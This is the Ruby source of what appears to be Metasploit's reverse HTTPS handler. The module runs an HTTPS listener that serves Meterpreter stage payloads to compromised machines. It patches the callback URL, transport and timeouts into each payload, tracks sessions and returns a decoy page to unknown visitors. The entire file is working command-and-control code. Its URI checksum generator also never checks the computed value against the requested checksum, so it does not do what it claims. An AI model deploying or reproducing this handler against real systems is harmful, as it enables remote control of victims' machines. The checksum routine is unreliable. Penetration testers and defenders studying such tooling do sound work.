require 'rex/io/stream_abstraction'
require 'rex/sync/ref'

module Msf
module Handler

###
#
# This handler implements the HTTP SSL tunneling interface.
#
###
module ReverseHttps

	include Msf::Handler

	#
	# Returns the string representation of the handler type, in this case
	# 'reverse_http'.
	#
	def self.handler_type
		return "reverse_https"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'tunnel'.
	#
	def self.general_handler_type
		"tunnel"
	end

	#
	# Define 8-bit checksums for matching URLs
	# These are based on charset frequency
	#
	URI_CHECKSUM_INITW = 92
	URI_CHECKSUM_INITJ = 88
	URI_CHECKSUM_CONN  = 98
	
	#
	# Map "random" URIs to static strings, allowing us to randomize
	# the URI sent in the first request.
	# 
	def process_uri_resource(uri_match)

		# This allows 'random' strings to be used as markers for
		# the INIT and CONN request types, based on a checksum
		uri_strip, uri_conn = uri_match.split('_', 2)
		uri_strip.sub!(/^\//, '')
		uri_check = Rex::Text.checksum8(uri_strip)
		
		# Match specific checksums and map them to static URIs
		case uri_check
		when URI_CHECKSUM_INITW
			uri_match = "/INITM" 
		when URI_CHECKSUM_INITJ
			uri_match = "/INITJM"
		when URI_CHECKSUM_CONN
			uri_match = "/CONN_" + ( uri_conn || Rex::Text.rand_text_alphanumeric(16) )
		end 
		
		uri_match
	end

	#
	# Create a URI that matches a given checksum
	#
	def generate_uri_checksum(sum)
		urix = nil
		uri = Rex::Text.rand_text_alphanumeric(3)
		("a".."z").sort_by {rand}.each do |x|
			urix = (uri + x) if Rex::Text.checksum8(uri + x)
			break if urix
		end
		return urix if urix
		raise RuntimeError, "Unable to generate a string with checksum #{sum}"
	end

	#
	# Initializes the HTTP SSL tunneling handler.
	#
	def initialize(info = {})
		super

		register_options(
			[
				OptString.new('LHOST', [ true, "The local listener hostname" ]),
				OptPort.new('LPORT', [ true, "The local listener port", 8443 ])
			], Msf::Handler::ReverseHttps)

		register_advanced_options(
			[
				OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
				OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcible shut down', (24*3600*7)]),
				OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300])
			], Msf::Handler::ReverseHttps)
	end
	
	#
	# Toggle for IPv4 vs IPv6 mode
	#
	def ipv6
		self.refname.index('ipv6') ? true : false
	end

	#
	# Create an HTTPS listener
	#
	def setup_handler

		comm = datastore['ReverseListenerComm']
		if (comm.to_s == "local")
			comm = ::Rex::Socket::Comm::Local
		else
			comm = nil
		end

		# Start the HTTPS server service on this host/port
		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
			datastore['LPORT'].to_i,
			ipv6 ? '::' : '0.0.0.0',
			true,
			{
				'Msf'        => framework,
				'MsfExploit' => self,
			},
			comm,
			datastore['SSLCert']
		)

		# Create a reference to ourselves
		obj = self

		# Add the new resource
		service.add_resource("/",
			'Proc' => Proc.new { |cli, req|
				on_request(cli, req, obj)
			},
			'VirtualDirectory' => true)

		self.conn_ids = []
		
		uhost = datastore['LHOST']
		uhost = "[#{uhost}]" if Rex::Socket.is_ipv6?(uhost)
		print_status("Started HTTPS reverse handler on https://#{uhost}:#{datastore['LPORT']}/")
	end

	#
	# Simply calls stop handler to ensure that things are cool.
	#
	def cleanup_handler
		stop_handler
	end

	#
	# Basically does nothing.  The service is already started and listening
	# during set up.
	#
	def start_handler
	end

	#
	# Removes the / handler, possibly stopping the service if no sessions are
	# active on sub-urls.
	#
	def stop_handler
		self.service.remove_resource("/") if self.service
	end

	attr_accessor :service # :nodoc:
	attr_accessor :conn_ids

protected

	#
	# Parses the HTTPS request
	#
	def on_request(cli, req, obj)
		sid  = nil
		resp = Rex::Proto::Http::Response.new

		print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")

		lhost = datastore['LHOST']
		
		# Default to our own IP if the user specified 0.0.0.0 (pebkac avoidance)
		if lhost.empty? or lhost == '0.0.0.0' or lhost == '::'
			lhost = Rex::Socket.source_address(cli.peerhost)
		end

		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
		
		uri_match = process_uri_resource(req.relative_resource)
		
		# Process the requested resource.
		case uri_match
			when /^\/INITJM/
				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
				url = "https://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
				#$stdout.puts "URL: #{url.inspect}"

				blob = ""
				blob << obj.generate_stage

				# This is a TLV packet - I guess somewhere there should be API for building them
				# in Metasploit :-)
				packet = ""
				packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
				packet << [url.length+8, 0x1000a].pack('NN')+url
				packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
				packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
				blob << [packet.length+8, 0].pack('NN') + packet

				resp.body = blob
				conn_ids << conn_id

				# Short-circuit the payload's handle_connection processing for create_session
				create_session(cli, {
					:passive_dispatcher => obj.service,
					:conn_id            => conn_id,
					:url                => url,
					:expiration         => datastore['SessionExpirationTimeout'].to_i,
					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
					:ssl                => false
				})

			when /^\/A?INITM?/

				url = ''

				print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
				resp['Content-Type'] = 'application/octet-stream'

				blob = obj.stage_payload

				# Replace the transport string first (TRANSPORT_SOCKET_SSL
				i = blob.index("METERPRETER_TRANSPORT_SSL")
				if i
					str = "METERPRETER_TRANSPORT_HTTPS\x00"
					blob[i, str.length] = str
				end
				print_status("Patched transport at offset #{i}...")

				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
				i = blob.index("https://" + ("X" * 256))
				if i
					url = "https://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
					blob[i, url.length] = url
				end
				print_status("Patched URL at offset #{i}...")

				i = blob.index([0xb64be661].pack("V"))
				if i
					str = [ datastore['SessionExpirationTimeout'] ].pack("V")
					blob[i, str.length] = str
				end
				print_status("Patched Expiration Timeout at offset #{i}...")

				i = blob.index([0xaf79257f].pack("V"))
				if i
					str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
					blob[i, str.length] = str
				end
				print_status("Patched Communication Timeout at offset #{i}...")

				resp.body = blob

				conn_ids << conn_id

				# Short-circuit the payload's handle_connection processing for create_session
				create_session(cli, {
					:passive_dispatcher => obj.service,
					:conn_id            => conn_id,
					:url                => url,
					:expiration         => datastore['SessionExpirationTimeout'].to_i,
					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
					:ssl                => true
				})

			when /^\/(CONN_.*)\//
				resp.body = ""
				conn_id = $1

				if true # if not self.conn_ids.include?(conn_id)
					print_status("Incoming orphaned session #{conn_id}, reattaching...")
					conn_ids << conn_id

					create_session(cli, {
						:passive_dispatcher => obj.service,
						:conn_id            => conn_id,
						:url                => "https://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00",
						:expiration         => datastore['SessionExpirationTimeout'].to_i,
						:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
						:ssl                => true
					})
				end
			else
				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
				resp.code    = 200
				resp.message = "OK"
				resp.body    = "<h3>No site configured at this address</h3>"
		end

		cli.send_response(resp) if (resp)

		# Force this socket to be closed
		obj.service.close_client( cli )
	end


end

end
end

